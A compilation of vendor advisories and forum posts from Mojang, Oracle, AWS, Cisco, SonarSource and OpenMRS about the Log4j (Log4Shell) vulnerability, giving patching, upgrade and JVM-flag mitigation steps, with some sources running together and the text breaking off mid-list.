# Important Message: Security vulnerability in Java Edition

Follow these steps to secure your game

Hello everyone! Earlier today, we identified a vulnerability in the form of an exploit within Log4j – a common Java logging library. This exploit affects many services – including Minecraft Java Edition.

This vulnerability poses a potential risk of your computer being compromised, and while this exploit has been addressed with all versions of the game client patched, you still need to take the following steps to secure your game and your servers.

## What you need to do

### Official game client

If you play Minecraft: Java Edition, but aren’t hosting your own server, you will need to take the following steps: Close all running instances of the game and the Minecraft Launcher. Start the Launcher again – the patched version will download automatically.

### Modified clients and third-party launchers

Modified clients and third-party launchers might ***not*** be automatically updated. In these cases, we recommend following the advice of your third-party provider. If the third-party provider has not patched the vulnerability, or has not stated it is safe to play, you should assume the vulnerability is not fixed and you are at risk by playing.

### Game Server

If you’re hosting your own Minecraft: Java Edition server, you'll need to take *different* steps depending on which version you’re using, in order to secure it.

* 1.18: Upgrade to 1.18.1, if possible. If not, use the same approach as for 1.17.x:
* 1.17: Add the following JVM arguments to your startup command line:

  -Dlog4j2.formatMsgNoLookups=true
* 1.12-1.16.5: Download [this file](https://launcher.mojang.com/v1/objects/02937d122c86ce73319ef9975b58896fc1b491d1/log4j2_112-116.xml) to the working directory where your server runs. Then add the following JVM arguments to your startup command line:

  -Dlog4j.configurationFile=log4j2\_112-116.xml
* 1.7-1.11.2: Download [this file](https://launcher.mojang.com/v1/objects/4bb89a97a66f350bc9f73b3ca8509632682aea2e/log4j2_17-111.xml) to the working directory where your server runs. Then add the following JVM arguments to your  startup command line:

  -Dlog4j.configurationFile=log4j2\_17-111.xml
* Versions below 1.7 are not affected

We’ll post any additional information on our social media channels, so keep an eye out! Thank you!

## Oracle Critical Patch Update Advisory - January 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 497 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [January 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2832416.1).

**Please note that on December 10, 2021, Oracle released a Security Alert for Apache Log4j vulnerabilities [CVE-2021-44228 and CVE-2021-45046](https://www.oracle.com/security-alerts/alert-cve-2021-44228.html). Customers should review the Alert if they have not already done so.**

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujan2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

# Update for Apache Log4j2 Issue (CVE-2021-44228)

### [V6] Last Updated Date: 2021/12/17 1:50 PM PST

AWS is aware of the recently disclosed issues relating to the open-source Apache “Log4j2" utility (CVE-2021-44228 and CVE-2021-45046).

Responding to security issues such as this one shows the value of having multiple layers of defensive technologies, which is so important to maintaining the security of our customers’ data and workloads.

We've taken this issue very seriously, and our world-class team of engineers has fully deployed the Amazon-developed Java hot patch available [here](https://github.com/corretto/hotpatch-for-apache-log4j2) to all AWS services. The hot patch updates the Java VM to disable the loading of the Java Naming and Directory Interface (JNDI) class, replacing it with a harmless notification message, which mitigates CVE-2021-44228 and CVE-2021-45046.  We will shortly complete our deployment of the updated Log4j library to all of our services.  More information about the Java hotpatch is available at <https://aws.amazon.com/blogs/security/open-source-hotpatch-for-apache-log4j-vulnerability/>.

Even with this hot patch deployed, customers should still deploy an updated Log4j library as quickly as they safely can, like we’re doing across AWS.

For more details on how to detect and remediate the Log4j CVEs using AWS services, please read our most recent blog post [here](https://aws.amazon.com/blogs/security/using-aws-security-services-to-protect-against-detect-and-respond-to-the-log4j-vulnerability).

No further service-specific updates are required after this final bulletin.

If you need additional details or assistance, please contact AWS Support.

**Amazon Connect**

Amazon Connect has been updated to mitigate the issues identified in CVE-2021-44228.

We recommend customers evaluate components of their environment which are outside of the Amazon Connect service boundary (such as Lambda functions that are called from contact flows) which may require separate/additional customer mitigation.

**Amazon Chime**

Amazon Chime SDK services have been updated to mitigate the issues identified in CVE-2021-44228 and CVE-2021-45046.

Amazon Chime services have been updated to mitigate the issues identified in CVE-2021-44228 and CVE-2021-45046.

**Amazon EMR**

CVE-2021-44228 impacts Apache Log4j versions between 2.0 and 2.14.1 when processing inputs from untrusted sources. EMR clusters launched with EMR 5 and EMR 6 releases include open source frameworks such as Apache Hive, Apache Flink, HUDI, Presto, and Trino, which use these versions of Apache Log4j. When you launch a cluster with EMR’s default configuration, it does not process inputs from untrusted sources. Many customers use the open source frameworks installed on their EMR clusters to process and log inputs from untrusted sources. Therefore, AWS recommends that you apply the solution described [here](https://docs.aws.amazon.com/emr/latest/ReleaseGuide/emr-log4j-vulnerability.html).

### [V5] Last Updated Date: 2021/12/16 3:15 PM PST

AWS is aware of the recently disclosed issues relating to the open-source Apache “Log4j2" utility (CVE-2021-44228 and CVE-2021-45046).

Responding to security issues such as this one shows the value of having multiple layers of defensive technologies, which is so important to maintaining the security of our customers’ data and workloads. We're taking this issue very seriously, and our world-class team of engineers has been working around the clock on our response and remediation. We expect to rapidly restore our full state of defense in depth.

One of the technologies we’ve developed and deployed extensively inside AWS is a hot patch for applications that may include Log4j. This hot patch updates the Java VM to disable the loading of the Java Naming and Directory Interface (JNDI) class, replacing it with a harmless notification message, which is an effective mitigation of CVE-2021-44228 and CVE-2021-45046.

We’ve also made this available as an open-source solution, which is available [here](https://aws.amazon.com/blogs/security/open-source-hotpatch-for-apache-log4j-vulnerability/).

Even with this hot patch deployed, customers should still deploy an updated Log4j library as quickly as they safely can.

For more details on how to detect and remediate the Log4j CVEs using AWS services, please read our most recent blog post [here](https://aws.amazon.com/blogs/security/using-aws-security-services-to-protect-against-detect-and-respond-to-the-log4j-vulnerability/).

Additional service-specific information is provided below. If you need additional details or assistance, please contact AWS Support.

 **Amazon EKS, Amazon ECS, and AWS Fargate**

 To help mitigate the impact of the open-source Apache “Log4j2" utility (CVE-2021-44228 and CVE-2021-45046) security issues on customers’ containers, Amazon EKS, Amazon ECS, and AWS Fargate are deploying a Linux-based update (hot-patch). This hot-patch will require customer opt-in to use, and disables JNDI lookups from the Log4J2 library in customers’ containers. These updates are available as an [Amazon Linux package](https://alas.aws.amazon.com/announcements/2021-001.html) for Amazon ECS customers, as a [DaemonSet](https://github.com/aws-samples/kubernetes-log4j-cve-2021-44228-node-agent) for Kubernetes users on AWS, and will be in supported AWS Fargate platform versions.

 Customers running Java-based applications on Windows containers are advised to follow Microsoft's guidance [here](https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/).

Even with this hot patch deployed, customers should still plan on deploying an updated Log4j library as quickly as they safely can.

Additional service-specific information is provided below. If you need additional details or assistance, please contact AWS Support.

**Amazon Kinesis**

A new version of the Kinesis Agent, which addresses the recently disclosed Apache Log4j2 library issue (CVE-2021-44228), is available [here.](https://github.com/awslabs/amazon-kinesis-agent)

**Amazon Inspector**

The Amazon Inspector service is patched against the Log4j issue.

The Inspector service helps detect CVE-2021-44228 (Log4Shell) issues within customer EC2 workloads and ECR images. Detections are currently available for impacted operating system level packages on Linux. These include, but are not limited to, apache-log4j2 and liblog4j2-java for Debian; log4j, log4jmanual and log4j12 for SUSE; and Elasticsearch for Alpine, Centos, Debian, Red Hat, SUSE and Ubuntu. Additional detections will be added as further impacts are identified by respective distribution security teams. Inspector decomposes Java archives stored within ECR images and generates findings for impacted packages or applications. These findings will be identified in the Inspector console under “CVE-2021-44228” or “IN1-JAVA-ORGAPACHELOGGINGLOG4J-2314720 - org.apache.logging.log4j:log4j-core”.

**Amazon Inspector Classic**

The Amazon Inspector service is patched against the Log4j issue.

The Inspector Classic service helps detect CVE-2021-44228 (Log4Shell) issues within customer EC2 workloads. Detections for CVE-2021-44228 (Log4Shell) are currently available for impacted operating system level packages on Linux. These include, but are not limited to, apache-log4j2 and liblog4j2-java for Debian; log4j, log4jmanual and log4j12 for SUSE; and Elasticsearch for Alpine, Centos, Debian, Red Hat, SUSE and Ubuntu.

**Amazon WorkSpaces/AppStream 2.0**

Amazon WorkSpaces and AppStream 2.0 are not affected by CVE-2021-44228 with default configurations. The default Amazon Linux 2 images of WorkSpaces and AppStream do not contain Log4j, and the versions of Log4j available in the Amazon Linux 2 default package repositories are not affected by CVE-2021-44228. However, if you have deployed the WorkDocs Sync client to Windows WorkSpaces, please take the actions recommended below.

Windows WorkSpaces by default do not have WorkDocs Sync installed. However, WorkSpaces used to have a default desktop shortcut to the WorkDocs Sync client installer before June 2021. The WorkDocs Sync client version 1.2.895.1 (and older) contains the Log4j component. If you have deployed the old WorkDocs Sync client versions to WorkSpaces, please restart the Sync client on WorkSpaces via management tools like SCCM, or instruct your WorkSpaces users to manually open the Sync client - “Amazon WorkDocs” from the list of installed programs. At launch, the Sync client would auto-update to the latest version 1.2.905.1 that is not affected by CVE-2021-44228. Workdocs Drive and Workdocs Companion applications are not affected by the issue.

**Amazon Timestream**

Amazon Timestream has been updated to mitigate the issues identified in CVE-2021-44228.

**Amazon DocumentDB**

As of December 13, 2021, Amazon DocumentDB has been patched to mitigate the Log4j issue referenced in CVE-2021-44228.

**Amazon CloudWatch**

Amazon CloudWatch services have been updated to mitigate the issues identified in CVE-2021-44228.

**AWS Secrets Manager**

AWS Secrets Manager has been updated to mitigate the issues identified in CVE-2021-44228.

**Amazon Single Sign-On**

Amazon Single Sign-On services have been updated to mitigate the issues identified in CVE-2021-44228.

**Amazon RDS Oracle**

Amazon RDS Oracle has updated the version of Log4j2 in use within the service. Access to RDS instances continues to be restricted by your VPCs and other security controls such as security groups and network access control lists (ACL). We strongly encourage you to review these settings to ensure proper access management to your [RDS instances](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html).

Per [Oracle Support document 2827611.1](https://support.oracle.com/epmos/faces/DocContentDisplay?id=2827611.1), the Oracle database itself is not affected by this issue.

**Amazon Cloud Directory**

Amazon Cloud Directory has been updated to mitigate the issues identified in CVE-2021-44228.

**Amazon Simple Queue Service (SQS)**

Amazon Simple Queue Service (SQS) completed patching for the Apache Log4j2 issue (CVE-2021-44228) for SQS’s data ingress and egress on December 13, 2021. We have also completed patching all other SQS systems that used Log4j2.

**AWS KMS**

AWS KMS has been updated to mitigate the issues identified in CVE-2021-44228.

**Amazon Redshift**

Amazon Redshift clusters have been automatically updated to mitigate the issues identified in CVE-2021-44228.

**AWS Lambda**

AWS Lambda does not include Log4j2 in its managed runtimes or base container images. These are therefore not affected by the issue described in CVE-2021-44228 and CVE-2021-45046.

For cases where a customer function includes an impacted Log4j2 version, we have applied a change to the Lambda Java managed [runtimes](https://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html) and [base container images](https://docs.aws.amazon.com/lambda/latest/dg/java-image.html) (Java 8, Java 8 on AL2, and Java 11) that helps to mitigate the issues in CVE-2021-44228 and CVE-2021-45046. Customers using managed runtimes will have the change applied automatically. Customers using container images will need to rebuild from the latest base container image, and redeploy.

Independent of this change, we strongly encourage all customers whose functions include Log4j2 to update to the latest version. Specifically, customers using the aws-lambda-java-log4j2 [library](https://docs.aws.amazon.com/lambda/latest/dg/java-logging.html#java-logging-log4j2) in their functions should update to version 1.4.0 and redeploy their functions.

**AWS Step Functions**

AWS Step Functions has been updated to mitigate the issues identified in CVE-2021-44228.

**AWS Web Application Firewall (WAF)**

To improve detection and mitigation relating to the recent Log4j security issue, customers of CloudFront, Application Load Balancer (ALB), API Gateway, and AppSync can optionally enable AWS WAF and apply two AWS Managed Rules (AMR): AWSManagedRulesKnownBadInputsRuleSet and AWSManagedRulesAnonymousIpList.

AWSManagedRulesKnownBadInputsRuleSet inspects request uri, body, and commonly used headers, while AWSManagedRulesAnonymousIpList helps block requests from services that allow the obfuscation of viewer identity. You can apply these rules by creating an AWS WAF web ACL, adding one or both rulesets to your web ACL, and then associating the web ACL with your CloudFront distribution, ALB, API Gateway or AppSync GraphQL APIs.

We continue to iterate the AWSManagedRulesKnownBadInputsRuleSet Rule Group as we learn more. To receive automatic updates to the AWSManagedRulesKnownBadInputsRuleSet, please choose the default version. For customers using AWS WAF Classic, you will need to migrate to AWS WAF or create custom regex match conditions. Customers can use AWS Firewall Manager which enables you to [configure AWS WAF rules](https://docs.aws.amazon.com/waf/latest/developerguide/waf-migrating-procedure.html) across multiple AWS accounts and resources from a single place. You can group rules, build policies, and centrally apply those policies across your entire infrastructure.

Managed Streaming for Apache Kafka is aware of the recently disclosed issue (CVE-2021-44228) relating to the Apache Log4j2 library and are applying updates as required. Please note that the builds of Apache Kafka and Apache Zookeeper offered in MSK currently use Log4j 1.2.17, which is not affected by this issue. Some MSK-specific service components use Log4j > 2.0.0 library and are being patched where needed.

**AWS Glue**

AWS Glue is aware of the recently disclosed security issue relating to the open-source Apache “Log4j2" utility (CVE-2021-44228). We have updated our control plane fleet that serves AWS Glue APIs for all supported Glue versions.

AWS Glue creates a new Spark environment that is isolated at the network and management level from all other Spark environments inside the AWS Glue service account. Your ETL jobs are executed on a single tenant environment. If your ETL jobs load a specific version of Apache Log4j, then you are advised to update your scripts to use the latest version of Apache Log4j. If you use AWS Glue development endpoints to author your scripts, then you are advised update the Log4j version you use there as well.

AWS Glue is also proactively applying the updates to new Spark environment across all supported regions. If you have questions or would like additional assistance, please contact us through the AWS Support.

**RDS**

Amazon RDS and Amazon Aurora are actively addressing all service usage of Log4j2 by applying updates. RDS-built relational database engines do not include the Apache Log4j library. Where upstream vendors are involved, we are applying their recommended mitigation. Customers may observe intermittent events during update of internal components.

**OpenSearch**

Amazon OpenSearch Service is deploying a service software update, version R20211203-P2, which contains an updated version of Log4j2. We will notify customers as the update becomes available in their regions, and update this bulletin once it is available worldwide.

To help detect exploitation of these vulnerabilities, Cisco has released Snort rules at the following location: [Talos Rules 2021-12-21](https://www.snort.org/advisories/talos-rules-2021-12-21)  Product fixes that are listed in this advisory will address both CVE-2021-44228 and CVE-2021-45046 unless otherwise noted.  Cisco has reviewed CVE-2021-45105 and CVE-2021-44832 and has determined that no Cisco products or cloud offerings are impacted by these vulnerabilities.  Cisco's standard practice is to update integrated third-party software components to later versions as they become available.  This advisory is available at the following link:<https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd>  Affected Products  * Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  This advisory only lists Cisco products and services that are known to include the impacted software component and thus may be vulnerable. Products and services that do not contain the impacted software component are not vulnerable and therefore are not listed in this advisory. Any Cisco product or service that is not explicitly listed in the Affected Products section of this advisory is not affected by the vulnerability or vulnerabilities described.  The [Vulnerable Products](#vp) section includes Cisco bug IDs for each affected product. The bugs are accessible through the Cisco Bug Search Tool and contain additional platform-specific information, including workarounds (if available) and fixed software releases.    Vulnerable Products Cisco investigated its product line to determine which products may be affected by these vulnerabilities.  The following table lists Cisco products that are affected by one or both of the vulnerabilities that are described in this advisory.

**Update 21 December 2021**

Hi all,

We’ve just [released](https://community.sonarsource.com/t/sonarqube-8-9-6-lts-and-9-2-4-released/55359) SonarQube 8.9.6 LTS and 9.2.4 (Latest) to eliminate confusion and avoid false-positive from vulnerability scanning tools in regards to: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046), [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/CVE-2021-45105).

In these new versions, the Elasticsearch component is updated to its latest bugfix version, 7.16.2, which updates the packaged Log4J dependency to 2.17.

Note: Although our security researchers have not found the previous SonarQube LTS (8.9.3, 8.9.4 or 8.9.5) or Latest (9.2.1,9.2.2 or 9.2.3) to be susceptible to any of the CVE’s in relation to Log4j at this time, this update has been done from an abundance of caution and we invite you to update to the latest version.

Andrea

**Update 16 December 2021**

Hi all,

We’ve just [released](https://community.sonarsource.com/t/sonarqube-8-9-5-lts-and-9-2-3-released/55144) SonarQube 8.9.5 LTS and 9.2.3 (Latest) to address [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). In these new versions:

* The SonarQube Log4J test dependency is updated to 2.16. This dependency is not used outside of unit testing, nor is it included in the SonarQube distribution. It is not susceptible to the CVEs being reported. Nonetheless, we have upgraded it to eliminate confusion.
* The Elasticsearch component is updated to its latest bug fix version, 7.16.1, which removes the potentially problematic components of Log4J. Additionally, it should be noted that SonarQube programmatically adds the `log4j2.formatMsgNoLookups=true` JVM property on starting up Elasticsearch.

  More explanations from Elasticsearch [here](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476).

Note that the LTS and the Latest are the only two supported versions. All other versions are past EOL. Please [update](https://www.sonarqube.org/downloads/) to one of the two supported versions as soon as you can.

Hi all,

SonarSource CTO Andrea Malagodi asked me to post this statement:

**Update 14 December 2021**

Hi all,

As stated earlier, current supported versions of SonarQube are not vulnerable to this attack. Nonetheless, out of an abundance of caution and to alleviate fears, we’ve released updates to the Latest and the LTS that update Log4J to a non-vulnerable version and that add the JVM property by default.

Please see the official announcement for details: [SonarQube 8.9.4 LTS and 9.2.2 released](https://community.sonarsource.com/t/sonarqube-8-9-4-lts-and-9-2-2-released/54936)

**If you have any concerns, you should upgrade to the newly-released 8.9.4 LTS or 9.2.2 (latest) immediately. No other versions are supported,** and as such have not been examined w/r/t the Log4J vulnerability.

We *will not* be releasing Log4J patches to any other versions, nor will we be examining/testing other versions for vulnerability to the Log4J exploit. Thus, we cannot answer your questions about other versions. If you’re worried, you should upgrade to a supported version immediately.

Ann

**Update 13.12.2021** We can also confirm that SonarCloud was not directly susceptible to this vulnerability, but out of an abundance of caution we have deployed a new version of SonarCloud that updates Log4J to a non-vulnerable version.

Colin

**Original statement 10 December 2021**

Hi all,

Concerning the reported Log4J vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), we can confirm that the SonarQube application itself does not rely on Log4J directly and that SonarQube LTS 8.9.x and SonarQube 9.2.1 are not directly susceptible to this vulnerability.

SonarQube includes a component from ElasticSearch that contains a Log4J component. At this time, we cannot affirm that there is no risk from this component. We recommend that you add the following property in `sonar.properties` or through an environment variable and then restart your SonarQube instance. This will effectively mitigate any risk there might be:

`sonar.search.javaAdditionalOpts=-Dlog4j2.formatMsgNoLookups=true`

We are monitoring the situation and will provide a fix - if one is necessary - once it is available.

Ann

I don’t think that the version of log4j passed to ElasticSearch (2.8.2) supports the property you recommend as a mitigation method as it seems it was introduced in 2.10.0.

We run Elasticsearch with vendor-provided libraries - we don’t “pass” any dependencies - and we have confirmed that the fix we’ve provided will work.

[@ganncamp](/u/ganncamp) Thanks for the clarification. I believe the property in your message is not correct. It should be `-Dlog4j2.formatMsgNoLookups=true` (log4j2, not log4j). I suggest you update your message, so that ppl don’t copy and configure the wrong property.

[@restfulhead](/u/restfulhead) Our tests confirmed that both settings are aliases and effectively mitigate CVE-2021-44228 on Elasticsearch. I have updated the original message with your suggestion to stick [to the official security advisory](https://logging.apache.org/log4j/2.x/security.html) and avoid any further confusion. Thank you for the heads-up!

[@colin\_expeto](/u/colin_expeto) The same mitigation can be applied. You can use the environment variable [`SONAR_SEARCH_JAVAADDITIONALOPTS`](https://docs.sonarqube.org/latest/setup/environment-variables/) to pass JVM options to the Elasticsearch instance:

```
$ docker run -p 9000:9000 -e SONAR_SEARCH_JAVAADDITIONALOPTS=-Dlog4j2.formatMsgNoLookups=true sonarqube:latest
[...]
2021.12.11 02:32:59 INFO  es[][o.e.n.Node] JVM arguments [[...] -Dlog4j2.formatMsgNoLookups=true [...]]

I have a question in the other direction: Presumably Log4J itself has been analyzed using SonarQube (\*), and in principle SonarQube can find deserialization vulnerabilities (which I think this is ? (\*\*)).

What was missing which kept SonarQube from finding this vulnerability in Log4J and how can SonarQube be improved to find these kind of vulnerabilities in the future ?

Hello, I have SonarQube 8.8.0. I applied the advised configuration. When I look for java processes in my machine, I can see the new java parameter `-Dlog4j2.formatMsgNoLookups=true` in this process:

```

```

But not in the “elasticsearch” one:

```

```

Is it normal?

EDIT 13/12/2021: I modified the wrong config parameter ( `sonar.web.javaAdditionalOpts` instead of `sonar.search.javaAdditionalOpts`). It works as expected now.

It doesn’t look normal to me, at least I’m observing the contrary behavior: The process with `postgresql` don’t have it but the one with `elastic` have.

Did you double check that you added the value to `sonar.search.javaAdditionalOpts` ?

I’m running the SonarQube community container from DockerHub.

I already have `sonar.search.javaAdditionalOpts` set to fix a bug with something else

`-Dsonar.search.javaAdditionalOpts=-Dnode.store.allow_mmap=false`

what is the syntax for adding this additional argument?

Can I do

`-Dsonar.search.javaAdditionalOpts=-Dnode.store.allow_mmap=false,-Dlog4j2.formatMsgNoLookups=true`

for example?

Or can I set it twice?

`-Dsonar.search.javaAdditionalOpts=-Dnode.store.allow_mmap=false` AND

`-Dsonar.search.javaAdditionalOpts=-Dlog4j2.formatMsgNoLookups=true` ?

Hi all,

Our version support is spelled out [here](https://www.sonarqube.org/downloads/lts/), in case you have not read it recently. So we can only speak to 8.9.3, the current LTS, and 9.2.1, the latest version, since they are the only supported versions. If you are on an older version we strongly recommend you upgrade.

Dear Implementers,

Please be aware of the following urgent security vulnerability:

### Severity: **Critical & Urgent**

### Affected Versions

* **OpenMRS Platform: v 2.4.0 and v 2.4.1**
* **RefApp: v2.12.0**

### Exploit

* A very urgent security issue in Apache Log4j 2 was made public Dec 10 2021 in a well-used library that affects many web services (see [CVE-2021-44228 - Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)).
* The issue can result in an unauthenticated attacker obtaining control of the server.
* The exploit code enabling this attack has been made publicly available.

### Recommendations

**All implementers using Platform v2.4.0 or 2.4.1 should do the following ASAP:**

**All implementers using RefApp v2.12.0 should do the following ASAP:**

* **Ensure Tomcat is run with -Dlog4j2.formatMsgNoLookups=true.**

### Next Community Steps

Our platform team is already planning to provide a 2.4.2 release with patched .war files, and we will also provide an updated RefApp release (2.12.1).

In the meantime, we’ve pulled the update into the current branch, the 2.5.x release branch (unreleased) and the 2.4.x branch (released but not widely used in production).

### Questions

Please refer to this OpenMRS Talk Post for further information as it becomes available, and for questions about how to apply this mitigation.

For direct questions or concerns, you can also connect with the OpenMRS Security Group at security@openmrs.org.

The commit that fixes this is [this one](https://github.com/openmrs/openmrs-core/commit/8daee9a411faae814db771434e0218efd170c9b1). Log4J 2.15.0 disables the problematic part of code by default and adds some guards which should prevent the same exploit from re-appearing.

No, but it should absolutely be regarded as vulnerable (the problem with being a “platform” in these circumstances is even if there were no way to exploit anything in core, any module might expose the vulnerability).

**Update**: We are aware that a **second** Log4J vulnerability has been discovered ([article link](https://www.zdnet.com/article/second-log4j-vulnerability-found-apache-log4j-2-16-0-released/)).
However, this one is deemed much narrower than the original CVE and far less critical.

The plan is to upgrade 2.5.0, update 2.4.x and release 2.4.3.

Hi [@binduak](/u/binduak)!

Unfortunately, it’s not quite as easy as that. The changes to get OpenMRS to be able to use Log4J2 in place of Log4J1 were fairly extensive and need re-evaluation for how they apply to Core 2.1.x. I.e., this wasn’t simply a matter of swapping out libraries.

At the heart of it there are two issues:

1. OpenMRS allows (some) logging configuration to be driven by global properties (`log.level`, `log.layout`, and `log.location`). Support for this is implemented [in a somewhat invasive way](https://github.com/openmrs/openmrs-core/blob/2ddd5d812e8a6b068b99d14b54bfa1912f7bc11a/api/src/main/java/org/openmrs/util/OpenmrsUtil.java#L502). Replicating this with Log4J2, which uses a fundamentally different configuration system was a challenge and, in retrospect, I didn’t do things quite correctly [hence, this PR I’m actively working on](https://github.com/openmrs/openmrs-core/pull/3949).
2. OpenMRS uses an appender that stores log messages in-memory. This needed to be completely re-written. (This is called the `MemoryAppender`)

So the actual implementation of Log4J2 in OpenMRS is spread across several commits:

* [a78c140](https://github.com/openmrs/openmrs-core/commit/a78c140b05b8bc5ef0890982918b44982a1d8589) (Base implementation)
* [6e9d0ca](https://github.com/openmrs/openmrs-core/commit/6e9d0caf247a201d77b5872738301cae4a35d451) (Bugfix)
* [1a659a8](https://github.com/openmrs/openmrs-core/commit/1a659a89cfcb20a135445dcc192c031f6c3f8cd4) (Liquibase for some reason embedded Logback)
* [9d2489b](https://github.com/openmrs/openmrs-core/commit/9d2489b1d1fe70f0673468af1423b6ed10f529f1) (Re-implementation of `MemoryAppender`)
* [6b0651b](https://github.com/openmrs/openmrs-core/commit/6b0651b9cae9468d89d10847b78c945575fed634) (Re-wiring the StartupFilter to use the new `MemoryAppender`)

Additionally, new commits were needed to the various modules that leverage the memory appender, notable the REST module:

* [ecc2edd](https://github.com/openmrs/openmrs-module-webservices.rest/commit/ecc2eddf104b94c919cf2584db31a848654f769e) (Initial implementation)
* [3e05209](https://github.com/openmrs/openmrs-module-webservices.rest/commit/3e05209b4f8ac8b8e48a8029129f2a4dbc1f370c) (A more reliable way of getting the `MemoryAppender`)
* [7a1be48](https://github.com/openmrs/openmrs-module-webservices.rest/commit/7a1be48299698828bca6083a22ddc775a25afeed) (Leveraging changes in 6b0651b to more easily get the `MemoryAppender`)

And the Legacy UI module:

